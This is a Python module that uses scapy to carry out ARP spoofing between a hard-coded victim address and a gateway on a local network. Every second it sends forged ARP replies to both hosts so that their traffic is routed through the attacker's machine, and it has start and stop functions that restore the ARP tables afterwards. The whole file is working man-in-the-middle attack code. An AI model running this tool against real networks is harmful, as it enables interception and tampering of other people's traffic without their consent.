import scapy.all as scapy
import threading

# Handles arp spoofing. Start, stop.
default_target_ip = '192.168.8.137'
default_host_ip = '192.168.8.243'
running = False

target_ip = default_target_ip
host_ip = default_host_ip


def get_mac1(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
    return answered_list[0][1].hwsrc

def get_mac(ip):
    '''
    return MAC address of any device connected to the network
    If ip is down return None
    '''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/ arp_request
    answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
    if answered_list:
        return answered_list[0][1].src


def spoof(target_ip, spoof_ip, verbose=False):
    '''
    Spoofs 'target_ip' saying that we are host_ip
    '''

    packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    # saved_packets.append(packet.summary())
    # print("PACKET PACKET YUP\n\n")
    # packet.show()
    # print("\n\nPACKET PACKET YUP")
    scapy.send(packet, verbose = False)
    if verbose:
        #get the MAC address of the default interface we are using
        self_mac = scapy.ARP().hwsrc  
        # print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst=destination_ip,
            hwdst = destination_mac,
            psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)



def start(target = default_target_ip, host = default_host_ip, verbose = False):
    # Stop printing so much
    if not verbose:
        scapy.conf.verb = 0
    
    print("Starting ARP Spoof")

    global running
    running = True
    
    #victom ip address
    target_ip = target

    #gateway ip
    host_ip = host

    def interval():
        if running:
            #Telling the target that we are the host
            spoof(target_ip, host_ip, verbose)

            # Telling the host that we are the target
            spoof(host_ip, target_ip, verbose)

            # rerun in a second
            timer = threading.Timer(1.0, interval)
            timer.start()
    interval()
            
def stop():
    global running

    if running == False:
        print("ARP spoof is not running")
        return

    print("Stopping ARP spoof...")

    running = False

    restore(target_ip, host_ip)
    restore(host_ip, target_ip)

    print("Stopped ARP Spoof")
